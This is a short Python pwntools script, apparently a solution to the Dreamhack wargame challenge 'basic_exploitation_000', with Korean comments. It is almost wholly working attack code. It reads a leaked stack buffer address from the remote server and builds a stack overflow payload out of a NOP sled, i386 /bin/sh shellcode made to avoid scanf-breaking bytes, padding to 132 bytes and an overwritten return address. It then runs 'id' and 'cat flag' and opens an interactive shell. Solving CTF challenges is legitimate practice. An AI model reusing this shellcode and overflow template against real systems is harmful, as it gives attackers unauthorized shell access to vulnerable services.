from pwn import *

# 1. 서버 연결
p = remote('host8.dreamhack.games', 22649) 
# p = process('./basic_exploitation_000') # 로컬 테스트 시

context.log_level = 'debug'
context.arch = 'i386'

# 2. 버퍼 주소 획득
p.recvuntil(b"buf = (")
buf_addr = int(p.recvuntil(b")", drop=True), 16)
log.info(f"Leaked Buffer Address: {hex(buf_addr)}")

# 3. 셸코드 (scanf 우회 버전 - 검증됨)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x08\x40\x40\x40\xcd\x80"

# 4. 페이로드 구성 (NOP Sled + Offset 132)
# 구조: [NOP 60] + [Shellcode] + [Padding] + [RET]
payload = b"\x90" * 60            
payload += shellcode
payload += b"\x90" * (132 - len(payload)) # 정확히 132바이트까지 채움

# NOP Sled 중간으로 점프 (안전빵)
target_addr = buf_addr + 0x30
payload += p32(target_addr)

# 5. 전송
p.sendline(payload)

# 6. 셸 획득 시도 (중요: ./flag 말고 cat flag 사용!)
# 셸이 떴는지 확인하기 위해 id 명령어를 먼저 보내봅니다.
p.sendline(b"id")
p.sendline(b"cat flag") 

p.interactive()